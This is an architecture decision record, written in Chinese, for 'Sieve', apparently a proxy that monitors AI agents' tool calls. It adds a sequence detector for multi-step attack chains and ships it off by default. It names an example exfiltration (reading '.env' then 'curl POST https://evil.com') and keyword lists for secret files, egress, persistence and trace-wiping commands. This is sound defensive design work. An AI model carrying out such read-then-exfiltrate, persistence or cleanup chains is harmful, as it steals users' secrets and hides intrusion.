# ADR-022: 行为序列联动窗口——结构化特征 + beta 默认关闭 + 双路径不变量

## 状态

**已接受**

> 决策日期：2026-05-01
> 范围：Phase B (Week 8-12)，`sieve-core::pipeline::inbound::SessionState` 扩展，GA **默认关闭**
> 关联 PRD：[v2.0 §5.7、§9 #15](../prd/sieve-prd-v2.0.md)
> 关联 codex review：[2026-05-01 codex review §C2、§E1/E2、Should #1、Must #5](../review/2026-05-01-codex-review-prd-v2.0.md)
> 关联风险：[R-V20-02 行为序列 FP 失控、R-V20-08 行为序列串会话](../prd/sieve-prd-v2.0.md#12-风险登记册)

---

## 背景

### 当前单次检测的覆盖盲区

v1.5 入站检测的每条规则独立评估单次 tool_use，无法识别多步 kill chain 中的"良性外观操作链"——每一步单独看都不触发规则，但组合在一起是明确攻击：

- `Read(".env")` → 单次看是正常文件读取；
- `curl POST https://evil.com` → 单次看可能只是 Medium；
- 两步连续在 5 分钟内发生 → RECON-EXFIL kill chain。

HIPS Readiness Assessment 把"行为序列联动"列为 Sieve v1.5 的"部分满足"项（即有框架概念但无实现）。

### v1 草案的 input hash 方案缺陷（codex review §C2 / Must #5）

v2.0 §5.7 初稿 `ToolUseRecord` 只存 `input_hash` 和 `rule_hits`。codex review 指出此方案无法识别**未命中单次规则的良性外观操作**：

- `Read(".env")` 若不触发任何入站规则，rule_hits 为空，input_hash 无法推断这是"读敏感文件"；
- `curl POST` 若域名不在黑名单，rule_hits 为空，input_hash 无法推断这是"网络外发"。

序列模式匹配需要的是**语义特征**，不是原始内容的 hash。input hash 方案需废弃，改为结构化安全特征。

### GA 默认关闭的决策逻辑（codex review §A2 / Should #1）

行为序列检测存在两类客观风险：

1. **FP 失控风险**（R-V20-02）：启发式规则未经真实用户数据验证，Phase B 实现阶段数据不足；
2. **串会话风险**（R-V20-08）：序列窗口归属实现错误时可能跨连接、跨会话混淆上下文。

codex review 结论：行为序列不应作为 Week 12 GA 必达卖点，推荐 beta flag 默认关闭，闭测用户 opt-in 收集数据后再评估 v2.1 是否默认开启。PRD v2.0 §9 #15 接受该建议并写入硬约束。

---

## 决策

### 1. 结构化安全特征（否定 input hash 方案）

`ToolUseRecord` 存储隐私安全的结构化特征，不存储原始 input 内容或 hash：

```rust
/// 隐私安全的结构化特征（不存原始 input，用于序列模式匹配）
struct ToolUseRecord {
    timestamp_ms: u64,
    tool_name: String,                // "Bash" / "Read" / "Write" / "Edit"
    tool_class: ToolClass,            // 枚举：Shell | FileRead | FileWrite | Network | Other
    path_category: Option<PathCategory>, // SensitiveSecret | Wallet | DotEnv | Code | Tmp | Other
    network_egress: bool,             // tool_input 含 curl/wget/POST 等外发特征
    persistence_mech: bool,           // tool_input 含 systemctl/launchctl/crontab 等持久化特征
    cleanup_mech: bool,               // tool_input 含 rm / shred / history -c 等清痕特征
    sensitive_file_hint: bool,        // tool_input 含 .env / id_rsa / keystore / mnemonic 等敏感关键词
    rule_hits: Vec<String>,           // 此次单次检测命中的规则 ID（可能为空）
}
```

**设计理由**：
- **隐私**：不存原始命令/参数，只存编译期定义的 boolean 和枚举特征，无法从记录还原用户输入；
- **序列可识别**：`Read(".env")` 即使不触发单次规则，`path_category=DotEnv` 和 `tool_class=FileRead` 也会被记录，RECON-EXFIL 模式可识别；
- **ML 升级路径**：v2.1 加 ML 分类器时，这些结构化特征直接作为训练集 feature vector。

### 2. 滑动窗口参数

`InboundFilter::SessionState` 加 `ToolUseSequence`，默认参数：

| 参数 | 默认值 | 说明 |
|------|------|------|
| N（窗口大小） | 10 | 保留最近 10 次 tool_use 记录 |
| TTL | 5 分钟（300_000ms） | 超出 TTL 的记录自动丢弃 |

> 这两个参数是 MVP 保守起步值（PRD v2.0 §14 OQ-V20-03 保留 Open）。Week 9 实现后以真实 dogfood 数据调优，v2.1 可能调整默认值或变为可配置。

**会话隔离**：每个 HTTP 连接（连接 ID）独立维护 `ToolUseSequence` 实例，**禁止跨连接共享**（R-V20-08 防护）。daemon 重启后序列窗口清空（不持久化），防止跨会话污染。

### 3. 三条 IN-SEQ-* 启发式（Phase B MVP）

| 规则 ID | 结构化特征模式 | 描述 | 处置 |
|---------|-------------|------|------|
| `IN-SEQ-01-RECON-EXFIL` | `tool_class=FileRead + path_category=SensitiveSecret/DotEnv/Wallet` 之后（5 分钟内）`network_egress=true` | 读敏感文件 + 网络外发 | StatusBar 通知 |
| `IN-SEQ-02-CLEANUP-AFTER-ATTACK` | `tool_class=Shell + network_egress=true` 之后 `cleanup_mech=true` | 执行远程脚本后立即删痕迹 | StatusBar 通知 |
| `IN-SEQ-03-PERSISTENCE-CHAIN` | 3 次 `persistence_mech=true`，跨不同 tool_name 调用，5 分钟内 | 多机制持久化（systemctl + launchctl + crontab）| StatusBar 通知 |

**Phase B GA 仅 ship 这 3 条 + 框架**，更多模式 v2.1 按真实 dogfood 数据补充。

**严重度 + 处置**：IN-SEQ-* 规则 severity=High，disposition=StatusBar，**不引入新 Block 路径**（PRD §9 #15 硬约束）。序列检测的误判只带来通知打扰，不阻断合法操作。

### 4. GA 默认关闭（PRD §9 #15 工程实现）

Phase B 行为序列检测通过 Cargo features 控制：

```toml
# Cargo.toml [features]
[features]
default = []                      # sequence_detection 不在 default 中
sequence_detection = []           # 必须显式 opt-in
```

config.toml 层面：

```toml
[features]
sequence_detection = false        # GA 默认关闭
```

daemon 启动时若 `sequence_detection=false`，跳过序列窗口初始化，`InboundFilter` 不维护 `ToolUseSequence`（零开销）。

闭测用户 + dogfood 用户主动将 `sequence_detection = true` 配置开启。GA 营销话术**不承诺**行为序列检测能力，不作为 $49/月 Pro 套餐必达卖点。

### 5. 双路径不变量（PRD §9 #15 + §5.7.4 的工程约束）

序列窗口更新必须同时覆盖 SSE 流路径和非流式 JSON 路径（v1.5.4 P0 教训：新功能只挂 SSE parser 后，JSON 路径自动绕过）：

| 更新点 | 路径 | 实现位置 |
|--------|------|---------|
| Anthropic SSE tool_use | SSE 聚合器解析 `content_block_stop` 后 | `forward_with_inbound_inspection` |
| Anthropic JSON tool_use | JSON helper 解析 `tool_use` block 后 | `handle_anthropic_json_inbound` |
| OpenAI SSE tool_calls | SSE delta 聚合器拼接 `tool_calls` 后 | `forward_with_openai_inbound_inspection` |
| OpenAI stream=false JSON | JSON helper 解析 `tool_calls` 后 | `handle_openai_json_inbound` |

**不满足该不变量视为 P0 漏洞**（与 v1.5.4 P0 同级，PRD v2.0 §5.7.4 明确定义）。

集成测试矩阵（Week 9 必须覆盖）：

| 协议 | 响应模式 | 序列触发测试 |
|------|---------|------------|
| Anthropic | text/event-stream（SSE 流）| ✅ |
| Anthropic | application/json（非流式）| ✅ |
| OpenAI | text/event-stream（stream=true）| ✅ |
| OpenAI | application/json（stream=false 默认）| ✅ |

每种组合都必须验证：mock RECON-EXFIL 攻击序列（2 步 tool_use）在对应路径下正确触发 IN-SEQ-01-RECON-EXFIL，并通过 StatusBar 通知。

### 6. 序列检测与单次检测的优先级关系

行为序列**不替代**单次检测，两者互补：

- 单次检测命中 Critical → 立即 Block（ADR-007 fail-closed），不等序列完成；
- 单次检测命中 High/Medium → 执行单次 disposition（StatusBar / Mark），同时把 `ToolUseRecord` 加入序列窗口；
- 序列触发 IN-SEQ-* → StatusBar 通知"过去 5 分钟内有可疑动作链"，不阻断后续请求。

### 7. 升级为 Block 类的触发条件（v2.1 路径）

IN-SEQ-* 规则从 StatusBar 升级为 Block 类，需满足三条条件，缺一不可：

1. 真实付费用户连续 **4 周 ≥ 50 个**序列样本数据收集（audit.db IN-SEQ-* 事件）；
2. 该序列模式 **FP rate < 0.5%**（与 PRD §9 #7 公理 12 对齐，Critical 规则红线）；
3. **写新 ADR** 评审，明确升级理由 + FP 数据 + 影响用户范围。

在满足条件前，**任何 PR 把 IN-SEQ-* disposition 改为 Block 必须阻塞**（CI 检查，未附新 ADR 则拒绝）。

---

## 影响

### 正面影响

1. **HIPS 能力补完**：行为序列检测是 HIPS Readiness Assessment "部分满足"项，Phase B 实现后理论 HIPS 评分从 70% 提升至 80%+（具体数值闭测后 re-assessment）；
2. **kill chain 早期预警**：识别"每步单独合法、整体是攻击"的多步操作链，弥补单次规则盲区；
3. **隐私安全**：结构化特征不存原始 input，只存编译期枚举，与 PRD §11 "数据不上传"一致；
4. **零开销当 disabled**：GA 默认关闭时序列窗口不初始化，对 99% GA 用户无性能影响；
5. **ML 升级路径铺平**：结构化特征是 v2.1 ML 分类器的天然训练 feature vector。

### 负面影响

1. **GA 不承诺，营销价值延后**：行为序列是 v2.0 HIPS 升级的核心差异化之一，但 GA 不作为必达卖点，Week 12 发布时无法在 landing page 突出；需等 v2.1 数据充足后升级营销话术；
2. **InboundFilter 复杂度增加**：`SessionState` 加滑动窗口后，`InboundFilter` 单元测试 + fuzz 覆盖范围扩大，维护成本增加；
3. **四路径更新负担**：双路径不变量要求四个 HTTP handler 各自更新序列窗口，代码重复，需抽公共 helper 函数（否则维护风险高）；
4. **串会话风险需持续关注**：连接 ID 隔离依赖 daemon 正确实现，集成测试必须验证跨连接隔离。

### 需要更新的文档

- `docs/design/architecture.md` —— 加 `SessionState::ToolUseSequence` 在 pipeline 中的位置（Phase B 架构图）
- `docs/design/data-model.md` —— `ToolUseRecord` 结构化特征字段定义
- `docs/guides/development.md` —— 行为序列 opt-in 配置说明 + Week 9 集成测试矩阵运行命令
- `CHANGELOG`（Phase B ship 时）—— IN-SEQ-01/02/03 规则 ID + 默认关闭状态

---

## 相关文档

- [PRD v2.0 §5.7](../prd/sieve-prd-v2.0.md) —— 行为序列联动完整需求（滑动窗口 + 三条启发式 + 双路径不变量）
- [PRD v2.0 §9 #15](../prd/sieve-prd-v2.0.md) —— 保守起步 + beta 默认关闭硬约束
- [PRD v2.0 §9 #16](../prd/sieve-prd-v2.0.md) —— content-type 路由矩阵测试硬约束（双路径不变量的测试要求来源）
- [PRD v2.0 §12 R-V20-02、R-V20-08](../prd/sieve-prd-v2.0.md) —— 行为序列 FP 失控 + 串会话风险
- [codex review 2026-05-01 §C2、§E1/E2、Should #1](../review/2026-05-01-codex-review-prd-v2.0.md) —— 结构化特征 + 默认关闭 + 双路径不变量的依据
- [ADR-007](./ADR-007-fail-closed-critical-actions.md) —— fail-closed 原则（序列检测不阻断时 Critical 单次检测仍 fail-closed）
- [ADR-014](./ADR-014-dual-layer-defense.md) —— 双层防御（序列检测在 SSE 层，不影响 Hook 层）
- [HIPS Readiness Assessment 2026-05-01](../review/2026-05-01-hips-readiness-assessment.md) —— v2.0 改造出发点（行为序列为"部分满足"项）
